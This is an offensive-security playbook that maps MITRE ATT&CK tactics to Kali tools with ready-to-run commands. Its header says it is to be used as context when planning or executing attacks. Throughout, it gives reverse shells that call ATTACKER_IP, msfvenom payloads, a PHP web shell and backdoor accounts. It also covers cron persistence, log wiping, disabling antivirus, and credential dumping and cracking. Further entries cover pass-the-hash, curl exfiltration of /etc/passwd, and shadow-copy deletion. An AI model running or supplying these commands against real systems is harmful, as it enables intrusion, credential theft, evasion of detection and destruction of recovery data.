# MITRE ATT&CK Enterprise Tactics — Offensive Playbook

> Practical reference mapping ATT&CK tactics → techniques → Kali tools with real commands.
> Use this as context when planning or executing attacks.

---

## TA0043 — Reconnaissance

**Goal:** Gather information to plan the attack.

### Key Techniques & Tools

#### T1595 — Active Scanning
```bash
# Port scanning
nmap -sC -sV -O -oA scan_results TARGET_IP
nmap -sS -p- --min-rate 5000 TARGET_IP         # Fast full port scan
masscan -p1-65535 TARGET_IP --rate=1000          # Ultra-fast scanning
rustscan -a TARGET_IP -- -sC -sV                 # Rust-based fast scan

# Web scanning
nikto -h http://TARGET
whatweb http://TARGET
wappalyzer (browser extension)
```

#### T1592 — Gather Victim Host Information
```bash
# OS fingerprinting
nmap -O TARGET_IP
p0f -i eth0                                      # Passive OS fingerprint

# Web tech stack
whatweb -a 3 http://TARGET
curl -sI http://TARGET                            # Header analysis
```

#### T1589 — Gather Victim Identity Information
```bash
# Email harvesting
theHarvester -d TARGET_DOMAIN -b all
hunter.io (web)
phonebook.cz (web)

# Username enumeration
kerbrute userenum --dc DC_IP -d DOMAIN userlist.txt
```

#### T1593 — Search Open Websites/Domains
```bash
# Subdomain enumeration
subfinder -d TARGET_DOMAIN -o subs.txt
amass enum -passive -d TARGET_DOMAIN
assetfinder TARGET_DOMAIN
gobuster dns -d TARGET_DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Google dorking
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com ext:sql | ext:db | ext:log
```

#### T1596 — Search Open Technical Databases
```bash
# Shodan
shodan search "hostname:target.com"
shodan host TARGET_IP

# Certificate transparency
crt.sh (https://crt.sh/?q=%25.target.com)
certspotter

# DNS records
dig any TARGET_DOMAIN
dnsenum TARGET_DOMAIN
dnsrecon -d TARGET_DOMAIN -t std
fierce --domain TARGET_DOMAIN
```

#### T1597 — Search Closed Sources
```bash
# Breach data
# Check HaveIBeenPwned API
# DeHashed (web)
# IntelX (web)
```

---

## TA0042 — Resource Development

**Goal:** Set up infrastructure and capabilities for the attack.

### Key Techniques & Tools

#### T1583 — Acquire Infrastructure
```bash
# C2 frameworks
sudo apt install -y metasploit-framework
sudo apt install -y sliver
# Cobalt Strike (commercial)
# Havoc C2 (https://github.com/HavocFramework/Havoc)

# Redirectors
# Use socat for port forwarding
socat TCP-LISTEN:80,fork TCP:C2_SERVER:80
```

#### T1587 — Develop Capabilities
```bash
# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o payload.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o shell.php

# Obfuscation
# Use Veil, Shellter, or manual encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x64/xor_dynamic -i 5 -f exe
```

#### T1585 — Establish Accounts
```bash
# Phishing infrastructure
gophish   # Phishing framework
setoolkit # Social Engineering Toolkit
```

---

## TA0001 — Initial Access

**Goal:** Get into the target network.

### Key Techniques & Tools

#### T1190 — Exploit Public-Facing Application
```bash
# Web vulnerability scanning
nikto -h http://TARGET
nuclei -u http://TARGET -t cves/
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
wpscan --url http://TARGET --enumerate vp,vt,u  # WordPress

# Directory/file discovery
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
dirsearch -u http://TARGET

# Specific exploits
searchsploit PRODUCT_NAME VERSION
msfconsole -q -x "search PRODUCT_NAME; use exploit/path; set RHOSTS TARGET; run"
```

#### T1133 — External Remote Services
```bash
# RDP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://TARGET
crowbar -b rdp -s TARGET/32 -u admin -C wordlist.txt

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET
medusa -h TARGET -u root -P wordlist.txt -M ssh

# VPN testing
ike-scan TARGET_IP
```

#### T1566 — Phishing
```bash
# Spear phishing setup
gophish                                           # Full phishing platform
setoolkit                                         # Social engineering toolkit
# Menu: 1) Social-Engineering Attacks → 2) Website Attack Vectors → 3) Credential Harvester
```

#### T1078 — Valid Accounts
```bash
# Credential testing
crackmapexec smb TARGET -u user -p password
crackmapexec winrm TARGET -u user -p password
evil-winrm -i TARGET -u user -p password
smbclient -L //TARGET -U user%password
```

---

## TA0002 — Execution

**Goal:** Run malicious code on the target.

### Key Techniques & Tools

#### T1059 — Command and Scripting Interpreter
```bash
# PowerShell (via evil-winrm or similar)
evil-winrm -i TARGET -u user -p pass
# > powershell -enc BASE64_PAYLOAD

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

#### T1203 — Exploitation for Client Execution
```bash
# Document exploits
msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
```

#### T1047 — Windows Management Instrumentation
```bash
# WMI execution
impacket-wmiexec DOMAIN/user:password@TARGET
crackmapexec smb TARGET -u user -p pass --exec-method wmiexec -x "whoami"
```

#### T1053 — Scheduled Task/Job
```bash
# Remote scheduled task
impacket-atexec DOMAIN/user:password@TARGET "command"
```

---

## TA0003 — Persistence

**Goal:** Maintain access across restarts and credential changes.

### Key Techniques & Tools

#### T1505.003 — Web Shell
```bash
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload via file upload vuln, then: http://TARGET/shell.php?cmd=whoami

# Weevely (encrypted web shell)
weevely generate PASSWORD shell.php
weevely http://TARGET/shell.php PASSWORD
```

#### T1098 — Account Manipulation
```bash
# Add user (Linux)
# useradd -m -s /bin/bash backdoor && echo "backdoor:password" | chpasswd && usermod -aG sudo backdoor

# Add user (Windows via evil-winrm)
# net user backdoor Password123! /add
# net localgroup administrators backdoor /add
```

#### T1053 — Scheduled Task/Cron
```bash
# Linux cron persistence
# (crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'") | crontab -

# Windows scheduled task (via impacket)
impacket-atexec DOMAIN/user:pass@TARGET "powershell -enc PAYLOAD"
```

#### T1547 — Boot or Logon Autostart Execution
```bash
# Linux: .bashrc, .profile, systemd service, init.d
# Windows: registry run keys, startup folder
# Access via evil-winrm/psexec and modify registry
```

#### T1136 — Create Account
```bash
# Kerberos golden ticket (persistence via AD)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN adminuser
export KRB5CCNAME=adminuser.ccache
impacket-psexec DOMAIN/adminuser@TARGET -k -no-pass
```

---

## TA0004 — Privilege Escalation

**Goal:** Gain higher-level permissions.

### Key Techniques & Tools

#### T1068 — Exploitation for Privilege Escalation
```bash
# Linux kernel exploits
# Check kernel version
uname -a
# Search for exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Automated enumeration
linpeas.sh                    # Linux
winpeas.exe                   # Windows
linux-exploit-suggester.sh
windows-exploit-suggester.py
```

#### T1548.002 — Abuse Elevation Control (Sudo)
```bash
# Check sudo permissions
sudo -l

# GTFOBins lookup for sudo exploits
# https://gtfobins.github.io/

# Common sudo exploits
# sudo vim -c '!sh'
# sudo find / -exec /bin/sh \;
# sudo python3 -c 'import os; os.system("/bin/bash")'
# sudo awk 'BEGIN {system("/bin/bash")}'
```

#### T1548.001 — Setuid/Setgid
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Check against GTFOBins for exploitation
```

#### T1078 — Valid Accounts (Privilege Escalation)
```bash
# Password reuse / credential hunting
grep -r "password" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
cat /etc/shadow                                   # If readable
```

#### T1055 — Process Injection (Windows)
```bash
# Via Meterpreter
meterpreter> migrate PID
meterpreter> getsystem
```

#### Windows-Specific Privesc
```bash
# Token impersonation
# Meterpreter: use incognito → list_tokens → impersonate_token
# PrintSpoofer, JuicyPotato, GodPotato, SweetPotato

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

---

## TA0005 — Defense Evasion

**Goal:** Avoid detection.

### Key Techniques & Tools

#### T1027 — Obfuscated Files or Information
```bash
# Payload encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x64/xor_dynamic -i 5 -f exe

# PowerShell obfuscation
# Invoke-Obfuscation (PowerShell module)

# Binary packing
upx --best payload.exe
```

#### T1070 — Indicator Removal
```bash
# Clear logs (Linux)
# > /var/log/auth.log
# > /var/log/syslog
# echo "" > ~/.bash_history

# Clear logs (Windows)
# wevtutil cl Security
# wevtutil cl System
# wevtutil cl Application
```

#### T1036 — Masquerading
```bash
# Rename binaries to blend in
# Copy payload as svchost.exe, explorer.exe, etc.
```

#### T1562 — Impair Defenses
```bash
# Disable AV (Windows)
# Set-MpPreference -DisableRealtimeMonitoring $true

# Firewall manipulation
# netsh advfirewall set allprofiles state off
```

---

## TA0006 — Credential Access

**Goal:** Steal credentials.

### Key Techniques & Tools

#### T1110 — Brute Force
```bash
# Hydra (multi-protocol)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "TARGET:/login:user=^USER^&pass=^PASS^:F=failed"
hydra -l admin -P rockyou.txt ssh://TARGET
hydra -l admin -P rockyou.txt ftp://TARGET
hydra -L users.txt -P rockyou.txt smb://TARGET

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# Hashcat (GPU-accelerated)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 500 md5_hashes.txt /usr/share/wordlists/rockyou.txt    # MD5crypt
hashcat -m 1800 sha512_hashes.txt rockyou.txt                      # SHA-512

# Medusa
medusa -h TARGET -u admin -P wordlist.txt -M ssh
```

#### T1003 — OS Credential Dumping
```bash
# Mimikatz (Windows - via Meterpreter)
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> kerberos_ticket_list

# secretsdump (remote)
impacket-secretsdump DOMAIN/user:pass@TARGET
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# SAM dump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Linux credential hunting
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt
```

#### T1558 — Steal or Forge Kerberos Tickets
```bash
# Kerberoasting
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# AS-REP Roasting
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Pass the Hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET
crackmapexec smb TARGET -u user -H NTLM_HASH
evil-winrm -i TARGET -u user -H NTLM_HASH

# Pass the Ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec DOMAIN/user@TARGET -k -no-pass
```

#### T1552 — Unsecured Credentials
```bash
# Search for passwords in files
grep -rn "password" /var/www/ /home/ /opt/ 2>/dev/null
find / -name "*.txt" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" 2>/dev/null | xargs grep -l "pass\|pwd\|secret\|key" 2>/dev/null

# Browser credentials
# LaZagne (multi-platform credential recovery)

# Config files
cat wp-config.php
cat /etc/mysql/my.cnf
cat .env
```

---

## TA0007 — Discovery

**Goal:** Understand the target environment.

### Key Techniques & Tools

#### T1046 — Network Service Discovery
```bash
nmap -sV -sC TARGET_SUBNET/24
nmap -sn TARGET_SUBNET/24                        # Ping sweep
arp-scan -l                                       # Local network discovery
netdiscover -r TARGET_SUBNET/24
```

#### T1087 — Account Discovery
```bash
# Linux
cat /etc/passwd
getent passwd
whoami && id

# Windows (AD)
net user /domain
net group "Domain Admins" /domain
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com"
enum4linux -a TARGET
rpcclient -U "user%pass" TARGET -c "enumdomusers"

# BloodHound (AD attack path mapping)
bloodhound-python -u user -p pass -d DOMAIN -dc DC_HOSTNAME -c All
# Then import into BloodHound GUI
```

#### T1083 — File and Directory Discovery
```bash
# Interesting files
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" -o -name "*.log" 2>/dev/null
find / -writable -type f 2>/dev/null
ls -la /home/*/
ls -la /tmp/ /opt/ /var/
```

#### T1049 — System Network Connections Discovery
```bash
netstat -tulpn
ss -tulpn
```

#### T1082 — System Information Discovery
```bash
# Linux
uname -a
cat /etc/os-release
hostname
ip a
cat /proc/version

# Windows
systeminfo
ipconfig /all
```

---

## TA0008 — Lateral Movement

**Goal:** Move through the network.

### Key Techniques & Tools

#### T1021 — Remote Services
```bash
# PSExec
impacket-psexec DOMAIN/user:pass@TARGET
impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET

# WMI
impacket-wmiexec DOMAIN/user:pass@TARGET

# WinRM
evil-winrm -i TARGET -u user -p pass
evil-winrm -i TARGET -u user -H NTLM_HASH

# SMB
impacket-smbexec DOMAIN/user:pass@TARGET
smbclient //TARGET/share -U user%pass

# SSH
ssh user@TARGET
ssh -i key.pem user@TARGET

# RDP
xfreerdp /v:TARGET /u:user /p:pass /cert-ignore
rdesktop TARGET -u user -p pass

# DCOM
impacket-dcomexec DOMAIN/user:pass@TARGET
```

#### T1550 — Use Alternate Authentication Material
```bash
# Pass the Hash
crackmapexec smb TARGET_SUBNET/24 -u user -H HASH
impacket-psexec -hashes :HASH DOMAIN/user@TARGET

# Pass the Ticket
export KRB5CCNAME=admin.ccache
impacket-psexec DOMAIN/admin@TARGET -k -no-pass

# Overpass the Hash
impacket-getTGT DOMAIN/user -hashes :NTLM_HASH
```

#### T1570 — Lateral Tool Transfer
```bash
# File transfer methods
python3 -m http.server 8080                      # Host files
certutil -urlcache -f http://ATTACKER/file.exe file.exe  # Windows download
wget http://ATTACKER/file -O /tmp/file            # Linux download
curl http://ATTACKER/file -o /tmp/file
scp file user@TARGET:/tmp/
impacket-smbserver share /path -smb2support       # SMB share
```

---

## TA0009 — Collection

**Goal:** Gather data of interest.

### Key Techniques & Tools

#### T1005 — Data from Local System
```bash
# Sensitive file search
find / -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" -o -name "*.kdbx" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
find /home -name ".bash_history" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts
```

#### T1039 — Data from Network Shared Drive
```bash
# Enumerate and access shares
smbclient -L //TARGET -U user%pass
smbmap -H TARGET -u user -p pass
crackmapexec smb TARGET -u user -p pass --shares
mount -t cifs //TARGET/share /mnt -o user=user,pass=pass
```

#### T1056 — Input Capture (Keylogging)
```bash
# Meterpreter keylogger
meterpreter> keyscan_start
meterpreter> keyscan_dump
meterpreter> keyscan_stop
```

#### T1113 — Screen Capture
```bash
meterpreter> screenshot
```

---

## TA0011 — Command and Control

**Goal:** Communicate with compromised systems.

### Key Techniques & Tools

#### T1071 — Application Layer Protocol
```bash
# Metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST ATTACKER_IP
set LPORT 443
run

# Sliver C2
sliver-server
generate --mtls ATTACKER_IP --os windows --arch amd64
mtls -l 8888

# Netcat listeners
nc -lvnp PORT
rlwrap nc -lvnp PORT                             # With readline support
socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/bash
```

#### T1572 — Protocol Tunneling
```bash
# SSH tunneling
ssh -L LOCAL_PORT:TARGET:REMOTE_PORT user@PIVOT   # Local forward
ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@PIVOT # Remote forward
ssh -D 9050 user@PIVOT                             # SOCKS proxy

# Chisel
./chisel server -p 8080 --reverse                  # On attacker
./chisel client ATTACKER:8080 R:socks              # On target

# Ligolo-ng (modern tunneling)
# Proxy on attacker, agent on target
```

#### T1090 — Proxy
```bash
# Proxychains
proxychains4 nmap -sT TARGET_INTERNAL
proxychains4 crackmapexec smb INTERNAL_SUBNET/24

# Configure /etc/proxychains4.conf
# socks5 127.0.0.1 1080
```

---

## TA0010 — Exfiltration

**Goal:** Steal data out of the network.

### Key Techniques & Tools

#### T1048 — Exfiltration Over Alternative Protocol
```bash
# DNS exfiltration
# dnscat2 server
dnscat2-server DOMAIN

# ICMP exfiltration
# icmpsh

# HTTP(S)
curl -X POST -d @/etc/passwd http://ATTACKER/upload
python3 -m http.server 8080  # On attacker to receive
```

#### T1041 — Exfiltration Over C2 Channel
```bash
# Meterpreter download
meterpreter> download /path/to/sensitive/file
meterpreter> download -r /path/to/directory

# SCP
scp user@TARGET:/etc/shadow ./loot/
```

#### T1567 — Exfiltration Over Web Service
```bash
# Upload to cloud storage via curl
# curl -T file https://transfer.sh/
```

---

## TA0040 — Impact

**Goal:** Disrupt, destroy, or manipulate.

### Key Techniques & Tools

#### T1486 — Data Encrypted for Impact (Ransomware)
```bash
# (For understanding/defense — NOT for malicious use)
# Ransomware typically uses AES + RSA encryption
# Test with controlled scenarios only
```

#### T1489 — Service Stop
```bash
# Stop critical services
# systemctl stop SERVICE
# net stop SERVICE
```

#### T1490 — Inhibit System Recovery
```bash
# Delete shadow copies (Windows)
# vssadmin delete shadows /all /quiet
# bcdedit /set {default} recoveryenabled no
```

---

## Quick Reference: Top Tools by Phase

| Phase | Primary Tools |
|-------|--------------|
| Recon | nmap, masscan, subfinder, theHarvester, amass, dnsrecon |
| Web Vuln Scan | nikto, nuclei, sqlmap, wpscan, gobuster, ffuf, feroxbuster |
| Exploitation | metasploit, searchsploit, impacket suite |
| Credential Attack | hydra, john, hashcat, crackmapexec, mimikatz |
| AD Attack | bloodhound, impacket, crackmapexec, evil-winrm, kerbrute |
| Privesc | linpeas, winpeas, GTFOBins, exploit-suggester |
| Lateral Movement | impacket (psexec/wmiexec/smbexec), evil-winrm, xfreerdp |
| C2 | metasploit, sliver, netcat, chisel, ligolo-ng |
| Tunneling | ssh, chisel, ligolo-ng, proxychains |
